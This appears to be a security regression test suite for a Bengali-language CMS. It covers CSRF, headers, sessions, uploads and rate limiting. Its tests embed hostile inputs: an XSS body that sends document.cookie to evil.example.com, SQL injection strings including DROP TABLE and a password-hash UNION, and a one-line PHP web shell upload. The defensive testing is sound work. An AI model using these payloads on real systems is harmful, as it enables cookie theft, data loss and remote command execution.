'use strict';

/**
 * Security regression suite.
 *
 * Every assertion here corresponds to a claim made in docs/SECURITY.md. If one
 * of these fails, the documentation is now wrong too — fix both.
 */

const test = require('node:test');
const assert = require('node:assert');
const H = require('./helpers');

let srv, anon;

test.before(async () => {
  srv = await H.startServer();
  anon = H.makeClient(srv.origin);
});
test.after(async () => { await srv?.close(); });

/* ------------------------------------------------------- HTTP hardening -- */

test('security headers are present on every response', async () => {
  const res = await anon.get('/');
  const h = res.headers;
  assert.match(h.get('content-security-policy') || '', /frame-ancestors 'none'/, 'CSP forbids framing');
  assert.match(h.get('content-security-policy') || '', /object-src 'none'/, 'no plugins');
  assert.match(h.get('content-security-policy') || '', /nonce-/, 'CSP uses a per-request nonce');
  assert.strictEqual(h.get('x-frame-options'), 'DENY');
  assert.strictEqual(h.get('x-content-type-options'), 'nosniff');
  assert.match(h.get('referrer-policy') || '', /strict-origin-when-cross-origin/);
  assert.strictEqual(h.get('x-powered-by'), null, 'server framework is not disclosed');
});

test('the CSP nonce changes between requests', async () => {
  const a = (await anon.get('/')).headers.get('content-security-policy');
  const b = (await anon.get('/')).headers.get('content-security-policy');
  const na = a.match(/'nonce-([^']+)'/)?.[1];
  const nb = b.match(/'nonce-([^']+)'/)?.[1];
  assert.ok(na && nb, 'both responses carry a nonce');
  assert.notStrictEqual(na, nb, 'nonces must not be reused');
});

test('cookies are scoped safely', async () => {
  // A fresh client: np_csrfid is only issued on the very first request.
  const res = await H.makeClient(srv.origin).get('/');
  const setCookie = res.headers.getSetCookie();
  const csrf = setCookie.find((c) => c.startsWith('np_csrfid='));
  assert.ok(csrf, 'a CSRF cookie is issued');
  assert.match(csrf, /HttpOnly/i, 'CSRF cookie is not readable by JS');
  assert.match(csrf, /SameSite=Lax/i);
});

/* ------------------------------------------------------------- CSRF ------ */

test('a state-changing POST without a CSRF token is rejected', async () => {
  await anon.get('/'); // obtain cookies, but send no token
  const res = await anon.post('/newsletter/subscribe', {
    body: { email: 'attacker@example.com' },
    headers: { Accept: 'application/json' },
  });
  assert.strictEqual(res.status, 403, `expected 403, got ${res.status}`);
  const row = srv.db.get("SELECT id FROM subscribers WHERE email = 'attacker@example.com'");
  assert.strictEqual(row, null, 'nothing was written');
});

test('a forged CSRF token is rejected', async () => {
  const page = await anon.get('/');
  const res = await anon.post('/newsletter/subscribe', {
    body: { email: 'attacker2@example.com', _csrf: page.csrf().slice(0, -4) + 'AAAA' },
    headers: { Accept: 'application/json' },
  });
  assert.strictEqual(res.status, 403);
});

test('a cross-origin CSRF request is rejected even with a valid token', async () => {
  const page = await anon.get('/');
  const res = await anon.post('/newsletter/subscribe', {
    body: { email: 'attacker3@example.com', _csrf: page.csrf() },
    headers: { Accept: 'application/json', Origin: 'https://evil.example.com' },
  });
  assert.strictEqual(res.status, 403, 'Origin mismatch must be fatal');
});

/* ------------------------------------------------------- stored XSS ------ */

test('a malicious article body is sanitised on save', async () => {
  const admin = await H.loginAdmin(srv.origin);
  const token = await H.csrfFrom(admin, '/admin/articles/new');
  const res = await admin.post('/admin/articles', {
    body: {
      _csrf: token,
      title_bn: 'এক্সএসএস পরীক্ষার জন্য যথেষ্ট দীর্ঘ শিরোনাম লেখা হয়েছে',
      body_bn: '<p>নিরাপদ টেক্সট</p><script>fetch("//evil.example.com?c="+document.cookie)</script>'
        + '<p onclick="steal()">ক্লিক করুন</p><iframe src="https://evil.example.com"></iframe>'
        + '<a href="javascript:alert(1)">লিংক</a><img src=x onerror="alert(2)">',
      status: 'published',
      category_id: 1,
    },
  });
  assert.strictEqual(res.status, 302, res.body.slice(0, 200));
  const row = srv.db.get('SELECT id, body_bn FROM articles ORDER BY id DESC LIMIT 1');
  assert.doesNotMatch(row.body_bn, /<script/i, 'script tags removed');
  assert.doesNotMatch(row.body_bn, /onclick|onerror/i, 'event handlers removed');
  assert.doesNotMatch(row.body_bn, /<iframe/i, 'iframes removed');
  assert.doesNotMatch(row.body_bn, /javascript:/i, 'javascript: URLs removed');
  assert.match(row.body_bn, /নিরাপদ টেক্সট/, 'legitimate text survives');
});

/* ----------------------------------------------------- authentication ---- */

test('an unauthenticated visitor is redirected away from the admin panel', async () => {
  for (const path of ['/admin', '/admin/articles', '/admin/settings', '/admin/users', '/admin/security']) {
    const res = await H.makeClient(srv.origin).get(path);
    assert.strictEqual(res.status, 302, `${path} should redirect`);
    assert.match(res.location, /^\/admin\/login/, `${path} should go to login, got ${res.location}`);
  }
});

test('a wrong password is rejected and does not reveal which half was wrong', async () => {
  const c = H.makeClient(srv.origin);
  const page = await c.get('/admin/login');
  const bad = await c.post('/admin/login', {
    body: { _csrf: page.csrf(), email: process.env.ADMIN_EMAIL, password: 'wrong-password-123' },
  });
  assert.notStrictEqual(bad.status, 302, 'login must not succeed');

  const c2 = H.makeClient(srv.origin);
  const page2 = await c2.get('/admin/login');
  const unknown = await c2.post('/admin/login', {
    body: { _csrf: page2.csrf(), email: 'nobody@nowhere.example', password: 'wrong-password-123' },
  });
  assert.notStrictEqual(unknown.status, 302);
  assert.strictEqual(bad.body.includes('ব্যবহারকারী'), unknown.body.includes('ব্যবহারকারী'),
    'unknown-user and wrong-password give the same response shape');
});

test('a valid login sets an HttpOnly session cookie and grants access', async () => {
  const admin = await H.loginAdmin(srv.origin);
  assert.ok(admin.jar.np_session, 'session cookie issued');
  const dash = await admin.get('/admin');
  assert.strictEqual(dash.status, 200);
  assert.match(dash.body, /noindex/, 'the admin panel is never indexed');
});

test('a session cookie with a tampered signature is rejected', async () => {
  const admin = await H.loginAdmin(srv.origin);
  const original = admin.jar.np_session;
  admin.jar.np_session = original.replace(/.{4}$/, 'AAAA');
  const res = await admin.get('/admin');
  assert.strictEqual(res.status, 302, 'a tampered cookie must not authenticate');
  assert.match(res.location, /^\/admin\/login/);
});

test('logging out destroys the session', async () => {
  const admin = await H.loginAdmin(srv.origin);
  const token = await H.csrfFrom(admin, '/admin');
  assert.strictEqual((await admin.get('/admin')).status, 200);
  const out = await admin.post('/admin/logout', { body: { _csrf: token } });
  assert.ok([200, 302].includes(out.status), `logout returned ${out.status}`);
  const after = await admin.get('/admin');
  assert.strictEqual(after.status, 302, 'the session no longer works');
});

/* ------------------------------------------------------------ injection -- */

test('SQL injection attempts in search return no extra rows and no error', async () => {
  for (const payload of ["' OR '1'='1", "'; DROP TABLE articles; --", "1 UNION SELECT password_hash FROM users"]) {
    const res = await anon.get(`/search?q=${encodeURIComponent(payload)}`);
    assert.strictEqual(res.status, 200, `payload ${payload} -> ${res.status}`);
    assert.doesNotMatch(res.body, /SQLite|SQLITE_ERROR|syntax error/i, 'no database error surfaced');
  }
  const intact = srv.db.get('SELECT COUNT(*) AS n FROM articles');
  assert.ok(intact.n > 0, 'the articles table survived');
  const leaked = await anon.get(`/search?q=${encodeURIComponent('password_hash')}`);
  assert.doesNotMatch(leaked.body, /\$2[aby]\$/, 'no bcrypt hash is ever rendered');
});

/*
 * SQL injection guard.
 *
 * Values must always be bound with `?`. The only interpolations allowed inside a
 * SQL string are shapes reviewed and listed here: a dynamic WHERE assembled from
 * hardcoded fragments (the values themselves are still bound), or a column name
 * chosen between two literals. If this test fails, either the list needs
 * reviewing or a genuinely injectable statement has been introduced.
 */
const REVIEWED_SQL_SHAPES = [
  { re: /where\.join\(/, why: 'WHERE assembled from hardcoded fragments; values bound' },
  { re: /SET \$\{col\} = \$\{col\} \+ 1\$\{extra\}/, why: 'col/extra chosen by a literal ternary' },
  // A `${...}` inside the *parameter array* (e.g. [`-${days} days`]) is a bound
  // value, not SQL text, so it is safe.
  { re: /\[`-\$\{/, why: 'interpolation is inside a bound parameter' },
];

test('SQL interpolation is limited to reviewed, non-user-controlled fragments', async () => {
  const fs = require('node:fs');
  const path = require('node:path');
  const root = path.join(__dirname, '..');
  const offenders = [];

  const walk = (dir) => {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) { walk(full); continue; }
      if (!entry.name.endsWith('.js')) continue;
      const rel = path.relative(root, full);
      fs.readFileSync(full, 'utf8').split('\n').forEach((line, i) => {
        // Uppercase only, so a JS `.update(` call is not mistaken for SQL UPDATE.
        if (!/\b(SELECT|INSERT INTO|UPDATE|DELETE FROM)\b/.test(line)) return;
        if (!/\$\{/.test(line)) return;
        if (REVIEWED_SQL_SHAPES.some((s) => s.re.test(line))) return;
        offenders.push(`${rel}:${i + 1}: ${line.trim().slice(0, 140)}`);
      });
    }
  };
  walk(path.join(root, 'src'));
  assert.deepStrictEqual(offenders, [],
    'unreviewed SQL interpolation — bind the value with ? instead:\n' + offenders.join('\n'));
});

test('every dynamic WHERE fragment is a literal, never an interpolated value', async () => {
  const fs = require('node:fs');
  const path = require('node:path');
  const root = path.join(__dirname, '..');
  const fragments = [];

  const walk = (dir) => {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) { walk(full); continue; }
      if (!entry.name.endsWith('.js')) continue;
      const rel = path.relative(root, full);
      const src = fs.readFileSync(full, 'utf8');
      // Match both quoted and backticked fragments pushed onto a WHERE array.
      for (const m of src.matchAll(/where\.push\((['`])([^'`]*)\1/g)) {
        const fragment = m[2];
        assert.doesNotMatch(fragment, /\$\{/,
          `${rel}: a WHERE fragment interpolates a value -> ${fragment.slice(0, 100)}`);
        fragments.push(`${rel}: ${fragment.slice(0, 50)}`);
      }
    }
  };
  walk(path.join(root, 'src'));
  assert.ok(fragments.length >= 10,
    `expected to audit many WHERE fragments, found ${fragments.length}`);
});

/* -------------------------------------------------------- scanner WAF ---- */

test('common scanner paths are refused', async () => {
  for (const path of ['/wp-admin/', '/wp-login.php', '/.env', '/phpmyadmin/', '/admin.php']) {
    const res = await H.makeClient(srv.origin).get(path);
    assert.notStrictEqual(res.status, 200, `${path} should not return 200 (got ${res.status})`);
  }
});

test('sensitive events are recorded in the security log', async () => {
  const n = srv.db.get('SELECT COUNT(*) AS n FROM security_events').n;
  assert.ok(n > 0, `${n} security events recorded during this suite`);
  const sample = srv.db.get('SELECT kind FROM security_events LIMIT 1');
  assert.ok(sample.kind, 'events are categorised');
});

test('raw visitor IPs are never stored', async () => {
  for (const table of ['analytics_events', 'comments', 'subscribers']) {
    const cols = srv.db.all(`PRAGMA table_info(${table})`).map((c) => c.name);
    assert.ok(!cols.includes('ip'), `${table} must not have a raw ip column`);
  }
  const events = srv.db.all('SELECT ip_hash FROM analytics_events LIMIT 5');
  for (const e of events) {
    assert.match(String(e.ip_hash || ''), /^[a-f0-9]+$/, 'only a hash is kept');
  }
});

/* ------------------------------------------------------------ uploads ---- */

test('an upload outside the allowed types is refused', async () => {
  const admin = await H.loginAdmin(srv.origin);
  const token = await H.csrfFrom(admin, '/admin/media');
  const fd = new FormData();
  fd.append('_csrf', token);
  fd.append('file', new Blob(['<?php system($_GET["c"]); ?>'], { type: 'application/x-php' }), 'shell.php');
  const res = await fetch(new URL('/admin/media', srv.origin), {
    method: 'POST',
    headers: { Cookie: `np_session=${admin.jar.np_session}; np_csrfid=${admin.jar.np_csrfid}` },
    body: fd,
    redirect: 'manual',
  });
  assert.notStrictEqual(res.status, 200, 'a PHP file must not be accepted');
  const row = srv.db.get("SELECT id FROM media WHERE original_name LIKE '%shell.php%'");
  assert.strictEqual(row, null, 'nothing was stored');
});

/* ------------------------------------------------------- brute force ----- */

test('repeated failed logins are rate limited', async () => {
  const c = H.makeClient(srv.origin);
  let limited = false;
  for (let i = 0; i < 12; i += 1) {
    const page = await c.get('/admin/login');
    const res = await c.post('/admin/login', {
      body: { _csrf: page.csrf(), email: process.env.ADMIN_EMAIL, password: 'definitely-wrong' },
    });
    if (res.status === 429) { limited = true; break; }
  }
  assert.ok(limited, 'the login endpoint must throttle brute-force attempts');
});
